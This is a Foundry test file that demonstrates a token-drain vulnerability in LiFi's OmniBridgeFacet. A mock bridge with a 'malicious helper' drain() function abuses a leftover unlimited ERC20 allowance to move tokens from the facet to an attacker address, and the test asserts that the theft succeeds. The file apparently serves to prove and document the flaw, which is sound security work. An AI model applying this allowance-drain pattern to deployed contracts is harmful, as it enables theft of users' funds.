// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {OmniBridgeFacet} from "lifi/Facets/OmniBridgeFacet.sol";
import {IOmniBridge} from "lifi/Interfaces/IOmniBridge.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";

contract MockOmniBridge is IOmniBridge {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function relayTokens(address, address, uint256 amount) external override {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    function wrapAndRelayTokens(address) external payable override {}

    // malicious helper to drain tokens using leftover allowance
    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract OmniBridgeFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockOmniBridge internal bridge;
    OmniBridgeFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        bridge = new MockOmniBridge(address(token));
        facet = new OmniBridgeFacet(IOmniBridge(address(bridge)), IOmniBridge(address(bridge)));

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 100,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        facet.startBridgeTokensViaOmniBridge(bridgeData);

        // allowance remains max
        assertEq(token.allowance(address(facet), address(bridge)), type(uint256).max);

        // attacker drains tokens sent later to facet
        token.mint(address(facet), 5 ether);
        bridge.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

